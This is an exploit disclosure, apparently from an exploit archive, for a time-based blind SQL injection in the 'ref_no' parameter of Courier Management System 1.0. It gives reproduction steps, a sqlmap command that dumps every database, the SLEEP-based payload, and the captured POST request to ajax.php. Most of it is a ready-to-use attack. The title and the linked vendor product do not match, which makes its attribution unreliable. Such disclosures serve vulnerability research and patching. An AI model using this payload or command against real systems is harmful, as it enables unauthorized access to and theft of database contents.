# Courier Management System 1.0 - 'ref_no' SQL Injection.md
## Exploit Author: Zhaiyi (Zeo)
## Date: 2020-12-11
## Vendor Homepage: https://www.sourcecodester.com/php/14615/task-management-system-using-phpmysqli-source-code.html
## Software Link: https://www.sourcecodester.com/download-code?nid=14615&title=Task+Management+System+using+PHP%2FMySQLi+with+Source+Code
## Affected Version: Version 1
## Category: Web Application

Step 1. Log into application with credentials

Step 2. Click on Branch

Step 3. Select New Branch http://127.0.0.1/index.php?page=new_branch

Step 4. Fill the form  , click on save

Step 5. Capture the request of the ""/ajax.php?action=get_parcel_heistory"" page inburpsute

Step 6. Save request and run sqlmap on request file using command " sqlmap -r request --time-sec=5 --dbs "

Step 7. This will inject successfully and you will have an information disclosure of all databases contents


```
---
Parameter: ref_no (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: ref_no=123' AND (SELECT 5575 FROM (SELECT(SLEEP(5)))ngIo) AND
'knst'='knst
---
```

POST
```
POST /ajax.php?action=get_parcel_heistory HTTP/1.1
Host: 10.211.55.4
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 69
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: PHPSESSID=7d3o3jettnoe5mlbqbu2r07kv0
Origin: http://10.211.55.4
Referer: http://10.211.55.4/htdocs/index.php?page=track
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

ref_no=123
```

![image](https://user-images.githubusercontent.com/38218756/102035475-67a6c380-3dfb-11eb-9b7d-d2c5f6247461.png)
